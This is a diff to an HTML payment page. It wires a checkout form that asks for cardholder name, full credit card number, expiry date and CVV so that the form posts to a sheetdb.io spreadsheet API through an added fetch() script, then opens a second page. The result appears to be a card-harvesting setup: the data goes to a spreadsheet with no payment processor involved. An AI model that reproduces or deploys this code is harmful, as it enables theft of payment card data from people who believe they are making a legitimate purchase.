@@ -16,7 +16,7 @@
 <div class="container">
 
 
-    <form action="">
+    <form action="https://sheetdb.io/api/v1/pyxar7xoeunuc" method="post" id="sheetdb-form">
 
 
         <div class="row">
@@ -36,11 +36,11 @@
                 <h3 class="title">payment</h3>
                 <div class="inputBox">
                     <span>name :</span>
-                    <input type="name" placeholder="name">
+                    <input type="name" placeholder="name" name="data[name]">
                 </div>
                 <div class="inputBox">
                     <span>email :</span>
-                    <input type="email" placeholder="email">
+                    <input type="email" placeholder="email" name="data[email]">
                 </div>
                 <div class="inputBox">
                     <span>cards accepted :</span>
@@ -48,26 +48,26 @@
                 </div>
                 <div class="inputBox">
                     <span>name of card :</span>
-                    <input type="text" placeholder="name of card">
+                    <input type="text" placeholder="name of card" name="data[name of card]">
                 </div>
                 <div class="inputBox">
                     <span>credit card number :</span>
-                    <input type="number" placeholder="0000-0000-0000-0000">
+                    <input type="number" placeholder="0000-0000-0000-0000" name="data[credit card number]">
                 </div>
                 <div class="inputBox">
                     <span>exp month :</span>
-                    <input type="text" placeholder="exp month">
+                    <input type="text" placeholder="exp month" name="data[exp month]">
                 </div>
 
 
                 <div class="flex">
                     <div class="inputBox">
                         <span>exp year :</span>
-                        <input type="number" placeholder="exp year">
+                        <input type="number" placeholder="exp year" name="data[exp year]">
                     </div>
                     <div class="inputBox">
                         <span>CVV :</span>
-                        <input type="text" placeholder="CVV">
+                        <input type="text" placeholder="CVV" name="data[CVV]">
                     </div>
                 </div>
 
@@ -84,6 +84,23 @@
 
 
 </div>    
+
+<script>
+           var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            window.open('page2.html', '_blank');
+
+          });
+        });
+</script>
    
 </body>
 </html>
